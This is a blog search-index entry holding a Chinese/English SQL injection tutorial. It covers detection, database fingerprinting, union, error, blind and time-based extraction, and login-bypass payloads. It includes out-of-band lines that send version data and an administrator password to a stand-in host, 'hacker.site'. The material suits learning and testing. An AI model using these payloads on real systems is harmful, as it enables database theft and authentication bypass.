<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SQLi 基础知识</title>
    <url>/2022/03/19/SQLi-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>SQL 注入是一种网络安全漏洞，允许攻击者<strong>干扰</strong>应用程序对其<strong>数据库</strong>的<strong>查询</strong>。它通常允许攻击者<strong>查看他们通常无法检索的数据</strong>。这可能包括属于<strong>其他用户</strong>的数据，或<strong>应用程序</strong>本身能够<strong>访问</strong>的任何其他数据。在许多情况下，攻击者可以<strong>修改</strong>或<strong>删除</strong>此数据，从而导致对应用程序的内容或行为的持续更改。<br>在某些情况下，攻击者可以升级 SQL 注入攻击以<strong>危害底层服务器</strong>或其他后端基础设施，或执行拒绝服务攻击。 （来自<a href="https://portswigger.net/web-security/sql-injection">这里</a>）。 </p>
<blockquote>
<p>在这篇文章中，我将假设我们发现了一个可能的 SQL 注入，我们将讨论确认 SQL 注入、数据库识别和执行操作的可能方法。</p>
</blockquote>
<h2 id="入口点检测"><a href="#入口点检测" class="headerlink" title="入口点检测"></a>入口点检测</h2><p>您可能已经发现了一个存在 <code>SQLi</code> 的站点，因为服务器在接收含有 <code>SQL</code> 相关语句的输入时表现异常。因此，您需要做的第一件事是如何在不破坏 <code>SQL</code> 语法的前提下注入数据。 </p>
<p>测试 PayLoad：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> [Nothing]</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">&#x27;</span>)</span><br><span class="line"><span class="string">&quot;)</span></span><br><span class="line"><span class="string">`)</span></span><br><span class="line"><span class="string">&#x27;))</span></span><br><span class="line"><span class="string">&quot;</span>))`</span><br><span class="line">`))</span><br></pre></td></tr></table></figure>

<p>然后，您需要知道如何<strong>修复查询，以免出现错误</strong>。为了修复查询，您可以 <strong>input</strong> 数据，以便闭合 <strong>previous query</strong>，或者您可以只 <strong>input</strong> 您的数据并<strong>在数据后面添加注释符</strong>。</p>
<p><em>请注意，如果您可以看到错误消息，或者您可以在查询正常工作和不正常工作时发现差异，这个阶段会更容易。</em></p>
<h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a><strong>注释符</strong></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line">#comment</span><br><span class="line"><span class="comment">-- comment     [Note the space after the double dash]</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"><span class="comment">/*! MYSQL Special SQL */</span></span><br><span class="line"><span class="comment">/*!50726 select version()*/</span> 向低版本兼容执行。<span class="comment">/*!xxxxxx select version()*/</span> <span class="operator">&lt;=</span> <span class="number">5.7</span><span class="number">.26</span> ，执行<span class="keyword">SQL</span>语句 ，<span class="operator">&gt;</span> <span class="number">5.7</span><span class="number">.26</span> 作为注释符使用。</span><br><span class="line"></span><br><span class="line">PostgreSQL</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"></span><br><span class="line">MSQL</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"></span><br><span class="line">Oracle</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"></span><br><span class="line">SQLite</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"></span><br><span class="line">HQL</span><br><span class="line">HQL does <span class="keyword">not</span> support comments</span><br></pre></td></tr></table></figure>
<h3 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h3><p>MySQL</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">09</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>A</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>B</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>C</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>D</span><br><span class="line"><span class="operator">%</span><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>Oracle</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">00</span></span><br><span class="line"><span class="operator">%</span><span class="number">09</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>A</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>B</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>C</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>D</span><br><span class="line"><span class="operator">%</span><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>MSSQL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00-%20</span><br></pre></td></tr></table></figure>

<h3 id="基于逻辑运算确认-SQLi"><a href="#基于逻辑运算确认-SQLi" class="headerlink" title="基于逻辑运算确认 SQLi"></a>基于逻辑运算确认 SQLi</h3><p>确认 SQLi 的方式之一是通过逻辑运算，并通过该运算获得预期结果。如 <code>?username=Peter</code> 和 <code>?username=Peter&#39; or &#39;1&#39;=&#39;1</code> ，通过在参数后面添加 SQL 逻辑运算表达式，当两个请求的响应内容一致时，即很可能说明你已经找到一个 SQLi 漏洞。</p>
<p>或者通过数学运算的概念也可以， 如 <code>?id=1</code> 和 <code>?id=2-1</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page.asp?id=1 or 1=1 -- true</span><br><span class="line">page.asp?id=1&#x27; or 1=1 -- true</span><br><span class="line">page.asp?id=1&quot; or 1=1 -- true</span><br><span class="line">page.asp?id=1 and 1=2 -- false</span><br></pre></td></tr></table></figure>

<blockquote>
<p>基于逻辑运算的 SQLi 测试列表<br><a href="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7d-n6kjX238xqV3-OB%2F-M7dsI5mMfPYjSqdzvtB%2Fsqli-logic.txt?alt=media&amp;token=6843509d-e5dd-4452-81d8-7a9b02de6a93">https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7d-n6kjX238xqV3-OB%2F-M7dsI5mMfPYjSqdzvtB%2Fsqli-logic.txt?alt=media&amp;token=6843509d-e5dd-4452-81d8-7a9b02de6a93</a></p>
</blockquote>
<h3 id="基于响应时间确认-SQLi"><a href="#基于响应时间确认-SQLi" class="headerlink" title="基于响应时间确认 SQLi"></a>基于响应时间确认 SQLi</h3><p>某些情况，使用基于逻辑运算的方式可能得不到预期的结果，因为某些原因导致响应结果并没有变化。所以需要基于响应时间的方式去确认 SQLi。我们可以通过执行诸如 <code>sleep()</code>等函数，或者执行复杂的数据处理请求。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL (string concat and logical ops) # 字符串连接及逻辑运算</span><br><span class="line">1&#x27; + sleep(10)</span><br><span class="line">1&#x27; and sleep(10)</span><br><span class="line">1&#x27; &amp;&amp; sleep(10)</span><br><span class="line">1&#x27; | sleep(10)</span><br><span class="line"></span><br><span class="line">PostgreSQL (only support string concat)</span><br><span class="line">1&#x27; || pg_sleep(10)</span><br><span class="line"></span><br><span class="line">MSQL</span><br><span class="line">1&#x27; WAITFOR DELAY &#x27;0:0:10&#x27;</span><br><span class="line"></span><br><span class="line">Oracle</span><br><span class="line">1&#x27; AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;[RANDSTR]&#x27;,[SLEEPTIME])</span><br><span class="line">1&#x27; AND 123=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;ASD&#x27;,10)</span><br><span class="line"></span><br><span class="line">SQLite</span><br><span class="line">1&#x27; AND [RANDNUM]=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</span><br><span class="line">1&#x27; AND 123=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))</span><br></pre></td></tr></table></figure>

<h3 id="确认数据库类型"><a href="#确认数据库类型" class="headerlink" title="确认数据库类型"></a>确认数据库类型</h3><p>确认数据库类型的方式之一是使用各数据库专有的，区别与其他数据库的函数，详见下表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;conv(&#x27;a&#x27;,16,2)=conv(&#x27;a&#x27;,16,2)&quot;</span>                   ,<span class="string">&quot;MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;connection_id()=connection_id()&quot;</span>                 ,<span class="string">&quot;MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;crc32(&#x27;MySQL&#x27;)=crc32(&#x27;MySQL&#x27;)&quot;</span>                   ,<span class="string">&quot;MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)&quot;</span>       ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;@@CONNECTIONS&gt;0&quot;</span>                                 ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;@@CONNECTIONS=@@CONNECTIONS&quot;</span>                     ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;@@CPU_BUSY=@@CPU_BUSY&quot;</span>                           ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;USER_ID(1)=USER_ID(1)&quot;</span>                           ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;ROWNUM=ROWNUM&quot;</span>                                   ,<span class="string">&quot;ORACLE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;RAWTOHEX(&#x27;AB&#x27;)=RAWTOHEX(&#x27;AB&#x27;)&quot;</span>                   ,<span class="string">&quot;ORACLE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;LNNVL(0=123)&quot;</span>                                    ,<span class="string">&quot;ORACLE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;5::int=5&quot;</span>                                        ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;5::integer=5&quot;</span>                                    ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;pg_client_encoding()=pg_client_encoding()&quot;</span>       ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;get_current_ts_config()=get_current_ts_config()&quot;</span> ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;quote_literal(42.5)=quote_literal(42.5)&quot;</span>         ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;current_database()=current_database()&quot;</span>           ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;sqlite_version()=sqlite_version()&quot;</span>               ,<span class="string">&quot;SQLITE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;last_insert_rowid()&gt;1&quot;</span>                           ,<span class="string">&quot;SQLITE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;last_insert_rowid()=last_insert_rowid()&quot;</span>         ,<span class="string">&quot;SQLITE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;val(cvar(1))=1&quot;</span>                                  ,<span class="string">&quot;MSACCESS&quot;</span>],</span><br><span class="line">[<span class="string">&quot;IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0&quot;</span>               ,<span class="string">&quot;MSACCESS&quot;</span>],</span><br><span class="line">[<span class="string">&quot;cdbl(1)=cdbl(1)&quot;</span>                                 ,<span class="string">&quot;MSACCESS&quot;</span>],</span><br><span class="line">[<span class="string">&quot;1337=1337&quot;</span>,   <span class="string">&quot;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;&#x27;i&#x27;=&#x27;i&#x27;&quot;</span>,     <span class="string">&quot;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&quot;</span>],</span><br></pre></td></tr></table></figure>

<p>此外，如果应用程序能够回显查询的数据，可以直接使用如： <code>uniont select version()</code> 等方式直接查询数据库类型及版本。</p>
<p><strong>如冇特别说明，以下例子使用均默认使用 MySQL 作为示例：</strong></p>
<h2 id="基于-union-的注入"><a href="#基于-union-的注入" class="headerlink" title="基于 union 的注入"></a>基于 union 的注入</h2><h3 id="检测字段数"><a href="#检测字段数" class="headerlink" title="检测字段数"></a>检测字段数</h3><p>如果可以回显查询的数据， 基于 union 的注入是 SQLi 五种基本注入类型中最优的攻击方式。数据查询语句语法规定，union 查询时，主查询与子查询必须必须要有相同的字段数才能正确执行。所以，为了执行 union 注入，首先需要确定原始SQL查询语句中涉及到多少的字段数。 </p>
<p>通常使用如下两种方式去确认原始查询语句涉及的字段数。</p>
<h4 id="Order-x2F-Group-by"><a href="#Order-x2F-Group-by" class="headerlink" title="Order&#x2F;Group by"></a>Order&#x2F;Group by</h4><p>递增 <code>Order/Group by</code> 后面的数值，直至应用程序响应不同的页面内容。即使 <code>GROUP BY</code> 和 <code>ORDER BY</code> 在 SQL 中功能并不一样，但是两者都可以用作确认字段数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 1--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2</span><span class="comment">--+    #True</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 3--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">4</span><span class="comment">--+    #False - Query is only using 3 columns</span></span><br><span class="line">                        #<span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,3--+    True</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; GROUP BY 1--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="number">2</span><span class="comment">--+    #True</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; GROUP BY 3--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="number">4</span><span class="comment">--+    #False - Query is only using 3 columns</span></span><br><span class="line">                        #<span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,3--+    True</span></span><br></pre></td></tr></table></figure>

<h4 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h4><p>增加 <code>null</code> 值，直接应用程序返回正确的响应。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT null-- - Not working</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">null</span>,<span class="keyword">null</span><span class="comment">-- - Not working</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT null,null,null-- - Worked</span></span><br></pre></td></tr></table></figure>

<p><em>您应该使用 <code>null</code> 值，因为在某些情况下，查询双方的字段类型必须相同，而 <code>null</code> 在每种情况下都有效。</em></p>
<h3 id="提取数据库名-表名-和-字段名"><a href="#提取数据库名-表名-和-字段名" class="headerlink" title="提取数据库名,表名 和 字段名"></a>提取数据库名,表名 和 字段名</h3><p>在接下来的示例中，我们将获取所有数据库的名称、数据库的表名、表的字段名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#Database names</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Tables of a database</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,gRoUp_cOncaT(<span class="number">0x7c</span>,table_name,<span class="number">0x7C</span>) <span class="keyword">fRoM</span> information_schema.tables <span class="keyword">wHeRe</span> table_schema<span class="operator">=</span>[database]</span><br><span class="line"></span><br><span class="line">#<span class="keyword">Column</span> names</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]</span></span><br></pre></td></tr></table></figure>

<p><em>在每个不同的数据库中发现这些数据的方法不同，但方法始终相同。</em></p>
<h2 id="基于隐藏的-union-注入"><a href="#基于隐藏的-union-注入" class="headerlink" title="基于隐藏的 union 注入"></a>基于隐藏的 union 注入</h2><p>如果您可以看见查询的输出但无法进行 union 的注入，则您可能正在面对基于隐藏 union 的注入。<br>通常在这种情况下，我们最终只能进行盲注攻击。要将盲注转换为基于 union 的注入，您需要获取当前查询语句的原型。我们可以通过使用盲注的方式获取，每个数据库均有默认的表存储着当前执行 SQL 语句。<br>提取 SQL 查询语句原型后，我们需要相应地调整Payload，安全地闭合原始查询，然后进行 union 注入。</p>
<p><strong>在 MySQL 中获取当前正在执行的 SQL 语句</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.`PROCESSLIST` <span class="keyword">where</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------------+------+---------+------+-----------+-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> ID <span class="operator">|</span> <span class="keyword">USER</span> <span class="operator">|</span> HOST            <span class="operator">|</span> DB   <span class="operator">|</span> COMMAND <span class="operator">|</span> <span class="type">TIME</span> <span class="operator">|</span> STATE     <span class="operator">|</span> INFO                                                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------------+------+---------+------+-----------+-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">87</span> <span class="operator">|</span> root <span class="operator">|</span> localhost:<span class="number">56330</span> <span class="operator">|</span> test <span class="operator">|</span> Query   <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span> executing <span class="operator">|</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.`PROCESSLIST` <span class="keyword">where</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------------+------+---------+------+-----------+-----------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>

<p>Complete Article: <a href="https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f">https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f</a></p>
<h2 id="Exploiting-Error-based"><a href="#Exploiting-Error-based" class="headerlink" title="Exploiting Error based"></a>Exploiting Error based</h2><p>If for some reason you <strong>cannot</strong> see the <strong>output</strong> of the <strong>query</strong> but you can <strong>see the error messages</strong>, <strong>you can make this error messages to <strong>ex-filtrate</strong> data from the database.【大意：定制错误消息，需要在触发报错语句之前执行某些语句，并将执行结果拼接到触发的报错语句中，通过报错泄露执行结果】</strong><br>Following a similar flow as in the Union Based exploitation you could manage to dump the DB.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">floor</span>() 报错原理：https:<span class="operator">/</span><span class="operator">/</span>www.secpulse.com<span class="operator">/</span>archives<span class="operator">/</span><span class="number">140616.</span>html</span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(CONCAT(@<span class="variable">@VERSION</span>),<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>)a <span class="keyword">group</span> <span class="keyword">by</span> x limit <span class="number">1</span>))</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>)y <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure>

<h2 id="Exploiting-Blind-SQLi"><a href="#Exploiting-Blind-SQLi" class="headerlink" title="Exploiting Blind SQLi"></a>Exploiting Blind SQLi</h2><p>In this case you cannot see the results of the query or the errors, but you can <strong>distinguished【区分】</strong> when the query <strong>return</strong> a <strong>true</strong> or a <strong>false</strong> response because there are different contents on the page.<br>In this case, you can <strong>abuse【利用】</strong> that behaviour to dump the database char by char:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">SELECT</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> information_schema.tables <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Exploiting-Error-Blind-SQLi"><a href="#Exploiting-Error-Blind-SQLi" class="headerlink" title="Exploiting Error Blind SQLi"></a>Exploiting Error Blind SQLi</h2><p>This is the <strong>same case as before</strong> but instead of distinguish between a true&#x2F;false response from the query you can <strong>distinguish between</strong> an <strong>error</strong> in the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> IF(<span class="number">1</span>,(<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables),<span class="string">&#x27;a&#x27;</span>))<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h2 id="Exploiting-Time-Based-SQLi"><a href="#Exploiting-Time-Based-SQLi" class="headerlink" title="Exploiting Time Based SQLi"></a>Exploiting Time Based SQLi</h2><p>In this case there <strong>isn’t</strong> any way to <strong>distinguish</strong> the <strong>response</strong> of the query based on the context of the page. But, you can make the page <strong>take longer to load</strong> if the guessed character is correct. We have already saw this technique in use before in order to <a href="./#confirming-with-timing">confirm a SQLi vuln</a>.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> users <span class="keyword">where</span> SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>)#</span><br></pre></td></tr></table></figure>

<h2 id="Stacked-Queries"><a href="#Stacked-Queries" class="headerlink" title="Stacked Queries"></a>Stacked Queries</h2><p>You can use stacked queries to <strong>execute multiple queries in succession【连续执行多个查询】</strong>. Note that while the subsequent queries are executed, the <strong>results</strong> are <strong>not returned to the application</strong>. <strong>Hence【因此】</strong> this technique is <strong>primarily【主要是】</strong> of use in relation to <strong>blind vulnerabilities</strong> where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
<p><strong>Oracle</strong> doesn’t support <strong>stacked queries.</strong> <strong>MySQL</strong>, <strong>Microsoft</strong> and <strong>PostgreSQL</strong> support them: <code>QUERY-1-HERE; QUERY-2-HERE</code></p>
<h2 id="Out-of-band-Exploitation"><a href="#Out-of-band-Exploitation" class="headerlink" title="Out of band Exploitation"></a>Out of band Exploitation</h2><p>If <strong>no-other</strong> exploitation method <strong>worked</strong>, you may try to make the database <strong>ex-filtrate【泄露】</strong> the info to an <strong>external host【外部主机】</strong> controlled by you. For example, via DNS queries:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># MySQL</span><br><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,version(),<span class="string">&#x27;.hacker.site\\a.txt&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h3 id="Out-of-band-data-exfiltration-via-XXE"><a href="#Out-of-band-data-exfiltration-via-XXE" class="headerlink" title="Out of band data exfiltration via XXE"></a>Out of band data exfiltration via XXE</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># Oracle</span><br><span class="line">a<span class="string">&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span>?xml version<span class="operator">=</span>&quot;1.0&quot; encoding<span class="operator">=</span>&quot;UTF-8&quot;?<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE root [ <span class="operator">&lt;</span><span class="operator">!</span>ENTITY <span class="operator">%</span> remote <span class="keyword">SYSTEM</span> &quot;http://&#x27;||(SELECT password FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;.hacker.site/&quot;<span class="operator">&gt;</span> <span class="operator">%</span>remote;]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;) FROM dual-- -</span></span><br></pre></td></tr></table></figure>

<h2 id="Automated-Exploitation"><a href="#Automated-Exploitation" class="headerlink" title="Automated Exploitation"></a>Automated Exploitation</h2><p>Check the <a href="sqlmap/">SQLMap Cheetsheat</a> to exploit a SQLi vulnerability with <a href="https://github.com/sqlmapproject/sqlmap"><strong>sqlmap</strong></a>.</p>
<h2 id="Tech-specific-info"><a href="#Tech-specific-info" class="headerlink" title="Tech specific info"></a>Tech specific info</h2><p>We have already discussed all the ways to exploit a SQLinjection vulnerability. Find some more tricks database technology dependant in this book:</p>
<ul>
<li><a href="mysql-injection/">MySQL</a></li>
<li><a href="postgresql-injection/">PostgreSQL</a></li>
</ul>
<p>Or you will find <strong>a lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"><strong>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</strong></a></p>
<h2 id="Authentication-bypass"><a href="#Authentication-bypass" class="headerlink" title="Authentication bypass"></a>Authentication bypass</h2><p>List to try to bypass the login functionality:</p>
<p>content-ref url&#x3D;”..&#x2F;login-bypass&#x2F;sql-login-bypass.md”<br><a href="../login-bypass/sql-login-bypass.md">sql-login-bypass.md</a><br>ndcontent-ref</p>
<h3 id="Authentication-Bypass-Raw-MD5"><a href="#Authentication-Bypass-Raw-MD5" class="headerlink" title="Authentication Bypass (Raw MD5)"></a>Authentication Bypass (Raw MD5)</h3><p>When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;SELECT * FROM admin WHERE pass = &#x27;&quot;.md5($password,<span class="literal">true</span>).&quot;&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>Allowing an attacker to <strong>craft a string【制作一个字符串】</strong> with a <code>true</code> statement such as <code>&#39; or &#39;SOMETHING</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">md5(&quot;ffifdyop&quot;, <span class="literal">true</span>) <span class="operator">=</span> <span class="string">&#x27;or&#x27;</span><span class="number">6</span>É]é<span class="operator">!</span>r,ùíb</span><br></pre></td></tr></table></figure>

<p>Challenge demo available at <a href="http://web.jarvisoj.com:32772/">http://web.jarvisoj.com:32772</a></p>
<h3 id="Hash-Authentication-Bypass"><a href="#Hash-Authentication-Bypass" class="headerlink" title="Hash Authentication Bypass"></a>Hash Authentication Bypass</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; AND 1=0 UNION ALL SELECT &#x27;</span>admin<span class="string">&#x27;, &#x27;</span><span class="number">81</span>dc9bdb52d04dc20036dbd8313ed055<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Recommended list</strong>:</p>
<p>You should use as username each line of the list and as password always: _<strong>Pass1234.</strong>_<br><em>(This payloads are also included in the big list mentioned at the beginning of this section)</em></p>
<p>file src&#x3D;”..&#x2F;..&#x2F;.gitbook&#x2F;assets&#x2F;sqli-hashbypass.txt”</p>
<h3 id="GBK-Authentication-Bypass"><a href="#GBK-Authentication-Bypass" class="headerlink" title="GBK Authentication Bypass"></a>GBK Authentication Bypass</h3><p>IF ‘ is being scaped you can use %A8%27, and when ‘ gets scaped it will be created: 0xA80x5c0x27 (<em>╘’</em>)</p>
